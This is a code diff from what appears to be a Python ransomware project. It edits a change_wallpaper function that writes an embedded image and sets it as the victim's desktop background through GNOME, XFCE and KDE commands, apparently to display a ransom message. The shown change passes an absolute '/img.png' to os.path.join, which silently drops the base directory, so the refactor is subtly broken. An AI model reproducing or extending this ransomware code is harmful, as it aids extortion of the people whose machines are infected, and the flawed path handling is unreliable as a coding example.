@@ -52,15 +52,15 @@ def open_decryptor():
 
 
 def change_wallpaper():
-    with open(variables.ransomware_path + "/img.png", 'wb') as f:
+    with open(os.path.join(variables.ransomware_path, "/img.png"), 'wb') as f:
         f.write(base64.b64decode(variables.img))
     gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
     
     xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
     xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
 
     kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
 var Desktops = desktops();                                                                                                                       
